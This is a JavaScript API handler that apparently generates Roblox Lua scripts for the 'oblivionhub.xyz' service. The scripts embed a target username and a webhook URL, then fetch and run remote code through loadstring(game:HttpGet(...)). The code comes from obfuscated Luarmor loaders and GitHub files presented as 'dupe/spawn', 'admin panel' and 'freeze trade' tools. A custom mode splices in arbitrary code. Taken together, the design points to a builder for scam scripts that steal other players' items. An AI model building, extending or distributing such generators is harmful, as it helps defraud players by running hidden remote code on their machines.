// api/generate.js
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { username, webhook, mode, brainrots, skins, gears, customCode, userId } = req.body;

    if (!username) {
        return res.status(400).json({ error: 'Username is required' });
    }

    try {
        const script = buildScript(
            username,
            webhook,
            mode,
            brainrots || [],
            skins || [],
            gears || [],
            customCode || ''
        );

        const pasteId = await saveToInternalPaste(
            script,
            `Script para ${username}`,
            userId
        );

        const baseUrl = process.env.BASE_URL || 'https://oblivionhub.xyz';
        const rawUrl = `${baseUrl}/api/paste?id=${pasteId}&raw=true`;

        return res.status(200).json({
            loadstring: `loadstring(game:HttpGet("${rawUrl}"))()`,
            script: script,
            pasteUrl: rawUrl,
            pasteId: pasteId,
            obfuscated: false
        });

    } catch (error) {
        console.error('Error general:', error);
        return res.status(500).json({ error: error.message });
    }
}

// ============================================================
//  CONSTRUIR SCRIPT
// ============================================================
function buildScript(username, webhook, mode, brainrots, skins, gears, customCode) {
    function luaTable(arr, indent = '    ') {
        if (arr.length === 0) return '{}';

        const items = arr.map(item =>
            `["${item.replace(/"/g, '\\"')}"] = true`
        );

        return '{\n' + items.map(s => indent + s).join(',\n') + '\n}';
    }

    let script = `getgenv().TARGET_USERNAME = "${username.replace(/"/g, '\\"')}"\n`;

    script += `getgenv().WEBHOOK_URL = "${webhook ? webhook.replace(/"/g, '\\"') : 'WEBHOOK_URL'}"\n`;

    script += `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;

    script += `getgenv().NORMAL_BASE_SKINS = ${luaTable(skins)}\n`;

    script += `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;


    // ============================================================
    //  LUARMOR BASE
    // ============================================================

    const guiBaseLoadstring =
        'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()';


    // ============================================================
    //  CONFIGURACIÓN DE CADA GUI
    // ============================================================

    const guiLoadstrings = {

        // Freeze Trade se mantiene como estaba
        freezetrade:
            'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7603f80b0fd8c5fddf99fe263fa8c771.lua"))()'
    };


    let fullScript = script;


    // ============================================================
    //  NORMAL
    // ============================================================

    if (mode === 'normal') {

        fullScript += `
task.spawn(function()
    ${guiBaseLoadstring}
end)`;

    }


    // ============================================================
    //  ADMIN PANEL
    //  LUARMOR + GUIAP.LUA
    // ============================================================

    else if (mode === 'adminpanel') {

        fullScript += `
-- Cargando GUI ADMIN PANEL desde Luarmor
task.spawn(function()
    ${guiBaseLoadstring}
end)

-- Cargando GUIAP.lua desde GitHub
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua"))()
end)`;

    }


    // ============================================================
    //  DUPE / SPAWN
    //  LUARMOR + GUIDUPE.LUA
    // ============================================================

    else if (mode === 'dupespawn') {

        fullScript += `
-- Cargando GUI DUPE / SPAWN desde Luarmor
task.spawn(function()
    ${guiBaseLoadstring}
end)

-- Cargando GUIDUPE.lua desde GitHub
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUIDUPE/refs/heads/main/GUIDUPE.lua"))()
end)`;

    }


    // ============================================================
    //  CODE SNIPER
    //  LUARMOR + Sniper.lua
    // ============================================================

    else if (mode === 'codesniper') {

        fullScript += `
-- Cargando GUI SNIPER desde Luarmor
task.spawn(function()
    ${guiBaseLoadstring}
end)

-- Cargando Sniper.lua desde GitHub
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/Sniper.lua"))()
end)`;

    }


    // ============================================================
    //  FREEZE TRADE
    // ============================================================

    else if (mode === 'freezetrade') {

        fullScript += `
task.spawn(function()
    ${guiLoadstrings.freezetrade}
end)`;

    }


    // ============================================================
    //  CUSTOM
    // ============================================================

    else if (mode === 'custom') {

        fullScript += `
task.spawn(function()
    ${guiBaseLoadstring}
end)`;

        if (customCode && customCode.trim()) {

            fullScript += `

task.spawn(function()
    ${customCode.replace(/\n/g, '\n    ')}
end)`;

        }
    }


    return fullScript;
}


// ============================================================
//  GUARDAR EN PASTEFY INTERNO (devuelve solo el ID)
// ============================================================
async function saveToInternalPaste(content, title, userId) {

    const baseUrl = process.env.BASE_URL || 'https://oblivionhub.xyz';

    const response = await fetch(`${baseUrl}/api/paste`, {
        method: 'POST',

        headers: {
            'Content-Type': 'application/json'
        },

        body: JSON.stringify({
            content: content,
            title: title || 'Untitled',
            userId: userId || null,
            public: true
        })
    });

    if (!response.ok) {

        const error = await response.json();

        throw new Error(
            error.error || 'Error al guardar el paste'
        );
    }

    const data = await response.json();

    return data.id;
}
